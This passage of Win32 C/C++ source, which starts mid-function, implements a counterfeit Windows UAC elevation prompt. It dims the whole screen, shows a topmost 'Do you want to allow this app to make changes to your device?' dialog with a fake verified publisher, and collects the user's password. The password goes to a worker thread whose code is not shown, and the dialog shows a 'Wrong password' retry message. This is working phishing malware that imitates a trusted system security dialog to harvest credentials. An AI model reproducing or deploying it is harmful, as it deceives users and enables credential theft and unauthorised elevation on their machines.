    hBmp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pvImageBits, NULL, 0);
    ReleaseDC(NULL, hdcScreen);

    if (hBmp) {
        UINT stride = width * 4;
        UINT bufferSize = stride * height;
        pConverter->CopyPixels(NULL, stride, bufferSize, (BYTE*)pvImageBits);
    }

cleanup:
    if (pConverter) pConverter->Release();
    if (pFrame) pFrame->Release();
    if (pDecoder) pDecoder->Release();
    if (pStream) pStream->Release();
    if (pFactory) pFactory->Release();
    return hBmp;
}

HBITMAP LoadImageFromResource(int resourceId, int* outWidth, int* outHeight) {
    HMODULE hMod = g_hInst ? g_hInst : GetModuleHandle(NULL);
    HRSRC hRes = FindResource(hMod, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hRes) return NULL;
    HGLOBAL hData = LoadResource(hMod, hRes);
    if (!hData) return NULL;
    DWORD dataSize = SizeofResource(hMod, hRes);
    const BYTE* data = (const BYTE*)LockResource(hData);
    if (!data) return NULL;
    return LoadImageFromMemory(data, dataSize, outWidth, outHeight);
}

void DrawAppIcon(HDC hdc, int x, int y) {
    int size = 52;
    if (hLogoBitmap) {
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcMem, hLogoBitmap);

        BLENDFUNCTION bf = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
        AlphaBlend(hdc, x, y, size, size, hdcMem, 0, 0, logoWidth, logoHeight, bf);

        SelectObject(hdcMem, hOldBmp);
        DeleteDC(hdcMem);
    } else {
    RECT iconRect = { x, y, x + size, y + size };
        HBRUSH hBgBrush = CreateSolidBrush(RGB(255, 182, 193));
        FillRect(hdc, &iconRect, hBgBrush);
        DeleteObject(hBgBrush);

        HFONT hIconFont = CreateFont(36, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
        HFONT hOldFont = (HFONT)SelectObject(hdc, hIconFont);
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, CLR_TEXT_WHITE);
        RECT textRect = { x, y, x + size, y + size };
        DrawText(hdc, "L", 1, &textRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(hdc, hOldFont);
        DeleteObject(hIconFont);
    }
}

void DrawFlatButton(HDC hdc, RECT* rc, const char* text, BOOL hover) {
    HBRUSH hBrush;
    if (hover) {
        hBrush = CreateSolidBrush(CLR_BTN_HOVER);
    } else {
        hBrush = CreateSolidBrush(CLR_BTN_NORMAL);
    }
    FillRect(hdc, rc, hBrush);
    DeleteObject(hBrush);

    HPEN hPen = CreatePen(PS_SOLID, 1, CLR_BTN_BORDER);
    HPEN hOldPen = (HPEN)SelectObject(hdc, hPen);
    HBRUSH hNullBrush = (HBRUSH)GetStockObject(NULL_BRUSH);
    SelectObject(hdc, hNullBrush);
    Rectangle(hdc, rc->left, rc->top, rc->right, rc->bottom);
    SelectObject(hdc, hOldPen);
    DeleteObject(hPen);

    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, CLR_TEXT_WHITE);
    SelectObject(hdc, hFontBtn);
    DrawText(hdc, text, -1, rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
}

LRESULT CALLBACK BtnYesProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc;
        GetClientRect(hwnd, &rc);
        DrawFlatButton(hdc, &rc, "Yes", bYesHover);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_MOUSEMOVE:
        if (!bYesHover) {
            bYesHover = TRUE;
            InvalidateRect(hwnd, NULL, FALSE);
            TRACKMOUSEEVENT tme = { sizeof(tme), TME_LEAVE, hwnd, 0 };
            TrackMouseEvent(&tme);
        }
        break;
    case WM_MOUSELEAVE:
        bYesHover = FALSE;
        InvalidateRect(hwnd, NULL, FALSE);
        break;
    }
    return CallWindowProc(origBtnYesProc, hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK BtnNoProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc;
        GetClientRect(hwnd, &rc);
        DrawFlatButton(hdc, &rc, "No", bNoHover);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_MOUSEMOVE:
        if (!bNoHover) {
            bNoHover = TRUE;
            InvalidateRect(hwnd, NULL, FALSE);
            TRACKMOUSEEVENT tme = { sizeof(tme), TME_LEAVE, hwnd, 0 };
            TrackMouseEvent(&tme);
        }
        break;
    case WM_MOUSELEAVE:
        bNoHover = FALSE;
        InvalidateRect(hwnd, NULL, FALSE);
        break;
    }
    return CallWindowProc(origBtnNoProc, hwnd, msg, wParam, lParam);
}

void DrawRevealButton(HDC hdc, RECT* rc, BOOL hover) {
    HBRUSH hBrush = CreateSolidBrush(hover ? CLR_BTN_HOVER : CLR_EDIT_BG);
    FillRect(hdc, rc, hBrush);
    DeleteObject(hBrush);

    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, CLR_TEXT_GRAY);

    HFONT hIconFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe MDL2 Assets");
    HFONT hOldFont = (HFONT)SelectObject(hdc, hIconFont);

    wchar_t icon[2] = { bPasswordVisible ? (wchar_t)0xED1A : (wchar_t)0xE7B3, 0 };
    DrawTextW(hdc, icon, -1, rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

    SelectObject(hdc, hOldFont);
    DeleteObject(hIconFont);
}

LRESULT CALLBACK BtnRevealProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc;
        GetClientRect(hwnd, &rc);
        DrawRevealButton(hdc, &rc, bRevealHover);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_MOUSEMOVE:
        if (!bRevealHover) {
            bRevealHover = TRUE;
            InvalidateRect(hwnd, NULL, FALSE);
            TRACKMOUSEEVENT tme = { sizeof(tme), TME_LEAVE, hwnd, 0 };
            TrackMouseEvent(&tme);
        }
        break;
    case WM_MOUSELEAVE:
        bRevealHover = FALSE;
        InvalidateRect(hwnd, NULL, FALSE);
        break;
    case WM_LBUTTONUP: {
        bPasswordVisible = !bPasswordVisible;
        SendMessageW(hEditPass, EM_SETPASSWORDCHAR, bPasswordVisible ? 0 : 0x25CF, 0);
        InvalidateRect(hEditPass, NULL, TRUE);
        InvalidateRect(hwnd, NULL, FALSE);
        SetFocus(hEditPass);
        return 0;
    }
    }
    return CallWindowProc(origBtnRevealProc, hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK EditSubclassProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        int textLen = GetWindowTextLengthW(hwnd);
        if (textLen == 0 && GetFocus() != hwnd) {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rc;
            GetClientRect(hwnd, &rc);

            HBRUSH hBrush = CreateSolidBrush(CLR_EDIT_BG);
            FillRect(hdc, &rc, hBrush);
            DeleteObject(hBrush);

            rc.left += 6;
            rc.top += 4;
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, CLR_TEXT_GRAY);
            HFONT hFont = (HFONT)SendMessage(hwnd, WM_GETFONT, 0, 0);
            HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
            DrawText(hdc, "Enter Password", -1, &rc, DT_SINGLELINE);
            SelectObject(hdc, hOldFont);

            EndPaint(hwnd, &ps);
            return 0;
        }
        break;
    }
    case WM_SETFOCUS:
        InvalidateRect(hwnd, NULL, TRUE);
        break;
    case WM_KILLFOCUS: {
        LRESULT res = CallWindowProc(origEditProc, hwnd, msg, wParam, lParam);
        InvalidateRect(hwnd, NULL, TRUE);
        UpdateWindow(hwnd);
        return res;
    }
    }
    return CallWindowProc(origEditProc, hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK DimWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);
        HBRUSH hDimBrush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rect, hDimBrush);
        DeleteObject(hDimBrush);
        EndPaint(hwnd, &ps);
        break;
    }
    case WM_ERASEBKGND:
        return 1;
    case WM_LBUTTONDOWN:
    case WM_RBUTTONDOWN:
    case WM_MBUTTONDOWN:
        if (hMainWnd) {
            SetForegroundWindow(hMainWnd);
            SetFocus(hMainWnd);
        }
        return 0;
    case WM_MOUSEACTIVATE:
        if (hMainWnd) {
            SetForegroundWindow(hMainWnd);
        }
        return MA_NOACTIVATE;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        hMainWnd = hwnd;
        hEditBrush = CreateSolidBrush(CLR_EDIT_BG);

        hFontTitle = CreateFont(20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
        hFontHeading = CreateFont(18, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
        hFontNormal = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
        hFontSmall = CreateFont(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
        hFontBtn = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");

        hEditPass = CreateWindowExW(0, L"EDIT", L"",
            WS_VISIBLE | WS_CHILD | ES_PASSWORD | ES_AUTOHSCROLL | WS_BORDER | ES_MULTILINE,
            25, 227, 470, 24,
            hwnd, NULL, NULL, NULL);
        SendMessageW(hEditPass, WM_SETFONT, (WPARAM)hFontNormal, TRUE);
        SendMessageW(hEditPass, EM_SETMARGINS, EC_LEFTMARGIN | EC_RIGHTMARGIN, MAKELPARAM(6, 6));
        SendMessageW(hEditPass, EM_SETPASSWORDCHAR, 0x25CF, 0);
        RECT editRect = { 6, 2, 464, 22 };
        SendMessageW(hEditPass, EM_SETRECT, 0, (LPARAM)&editRect);
        origEditProc = (WNDPROC)SetWindowLongPtrW(hEditPass, GWLP_WNDPROC, (LONG_PTR)EditSubclassProc);

        hBtnReveal = CreateWindow("BUTTON", "",
            WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
            497, 227, 38, 24,
            hwnd, (HMENU)3, NULL, NULL);
        origBtnRevealProc = (WNDPROC)SetWindowLongPtr(hBtnReveal, GWLP_WNDPROC, (LONG_PTR)BtnRevealProc);

        hBtnYes = CreateWindow("BUTTON", "Yes",
            WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
            25, 270, 250, 40,
            hwnd, (HMENU)1, NULL, NULL);
        origBtnYesProc = (WNDPROC)SetWindowLongPtr(hBtnYes, GWLP_WNDPROC, (LONG_PTR)BtnYesProc);

        hBtnNo = CreateWindow("BUTTON", "No",
            WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
            285, 270, 250, 40,
            hwnd, (HMENU)2, NULL, NULL);
        origBtnNoProc = (WNDPROC)SetWindowLongPtr(hBtnNo, GWLP_WNDPROC, (LONG_PTR)BtnNoProc);
        break;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rect;
        GetClientRect(hwnd, &rect);

        RECT headerRect = { 0, 0, rect.right, 90 };
        HBRUSH hHeaderBrush = CreateSolidBrush(CLR_BG_HEADER);
        FillRect(hdc, &headerRect, hHeaderBrush);
        DeleteObject(hHeaderBrush);

        SetBkMode(hdc, TRANSPARENT);

        SetTextColor(hdc, CLR_TEXT_WHITE);
        SelectObject(hdc, hFontTitle);
        TextOut(hdc, 25, 25, "Do you want to allow this app to make", 38);
        TextOut(hdc, 25, 50, "changes to your device?", 24);

        RECT contentRect = { 0, 90, rect.right, rect.bottom };
        HBRUSH hDarkBrush = CreateSolidBrush(CLR_BG_DARK);
        FillRect(hdc, &contentRect, hDarkBrush);
        DeleteObject(hDarkBrush);

        DrawAppIcon(hdc, 25, 110);

        SetTextColor(hdc, CLR_TEXT_WHITE);
        SelectObject(hdc, hFontHeading);
        TextOut(hdc, 90, 115, "Luka", 4);

        SelectObject(hdc, hFontNormal);
        TextOut(hdc, 25, 170, "Verified publisher: Vivimeng Inc.", 33);
        TextOut(hdc, 25, 192, "File origin: Hard drive on this computer", 40);

        if (bShowError) {
            SetTextColor(hdc, CLR_TEXT_YELLOW);
            SelectObject(hdc, hFontSmall);
            TextOut(hdc, 25, 253, "Wrong password, try again.", 26);
        }

        EndPaint(hwnd, &ps);
        break;
    }
    case WM_CTLCOLOREDIT: {
        HDC hdcEdit = (HDC)wParam;
        SetTextColor(hdcEdit, CLR_TEXT_WHITE);
        SetBkColor(hdcEdit, CLR_EDIT_BG);
        return (LRESULT)hEditBrush;
    }
    case WM_CTLCOLORSTATIC: {
        HDC hdcStatic = (HDC)wParam;
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LRESULT)GetStockObject(NULL_BRUSH);
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == 1) {
            wchar_t wbuffer[256];
            char buffer[256];
            GetWindowTextW(hEditPass, wbuffer, 256);
            WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, buffer, 256, NULL, NULL);

            bShowError = FALSE;
            InvalidateRect(hwnd, NULL, FALSE);

            EnableWindow(hBtnYes, FALSE);
            EnableWindow(hBtnNo, FALSE);
            EnableWindow(hEditPass, FALSE);
            EnableWindow(hBtnReveal, FALSE);

            char* passCopy = strdup(buffer);
            hWorkerThread = CreateThread(NULL, 0, ProcessLogicThread, passCopy, 0, NULL);
        }
        else if (LOWORD(wParam) == 2) {
            PostQuitMessage(0);
        }
        break;
    }
    case WM_WORKER_DONE: {
        int result = (int)wParam;
        if (result == 4) {
            bShowError = TRUE;
            EnableWindow(hBtnYes, TRUE);
            EnableWindow(hBtnNo, TRUE);
            EnableWindow(hEditPass, TRUE);
            EnableWindow(hBtnReveal, TRUE);
            SetFocus(hEditPass);
            SetWindowTextW(hEditPass, L"");
            InvalidateRect(hwnd, NULL, FALSE);
        } else {
            PostQuitMessage(0);
        }
        break;
    }
    case WM_DESTROY:
        DeleteObject(hFontTitle);
        DeleteObject(hFontHeading);
        DeleteObject(hFontNormal);
        DeleteObject(hFontSmall);
        DeleteObject(hFontBtn);
        if (hEditBrush) {
            DeleteObject(hEditBrush);
            hEditBrush = NULL;
        }
        if (hDimWnd) {
            DestroyWindow(hDimWnd);
            hDimWnd = NULL;
        }
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    g_hInst = hInstance;
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    GetModuleFileName(NULL, exePath, MAX_PATH);

    hLogoBitmap = LoadImageFromResource(IDR_LOGO, &logoWidth, &logoHeight);

    const char DIM_CLASS[] = "UACDimOverlay";
    WNDCLASSEX wcDim = { 0 };
    wcDim.cbSize = sizeof(WNDCLASSEX);
    wcDim.lpfnWndProc = DimWndProc;
    wcDim.hInstance = hInstance;
    wcDim.lpszClassName = DIM_CLASS;
    wcDim.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcDim.hbrBackground = NULL;
    RegisterClassEx(&wcDim);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    hDimWnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_LAYERED,
        DIM_CLASS,
        NULL,
        WS_POPUP | WS_VISIBLE,
        0, 0, screenW, screenH,
        NULL, NULL, hInstance, NULL
    );
    SetLayeredWindowAttributes(hDimWnd, 0, 180, LWA_ALPHA);

    const char CLASS_NAME[] = "UACDialog";
    WNDCLASSEX wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(CLR_BG_DARK);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    RegisterClassEx(&wc);

    int winW = 560;
    int winH = 335;
    int x = (screenW - winW) / 2;
    int y = (screenH - winH) / 2;

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST,
        CLASS_NAME,
        NULL,
        WS_POPUP | WS_VISIBLE,
        x, y, winW, winH,
        NULL, NULL, hInstance, NULL
    );

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    SetForegroundWindow(hwnd);

    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hLogoBitmap) {
        DeleteObject(hLogoBitmap);
        hLogoBitmap = NULL;
    }
    if (hDimWnd) DestroyWindow(hDimWnd);
    GdiplusShutdown(gdiplusToken);
    CoUninitialize();
    return 0;
}

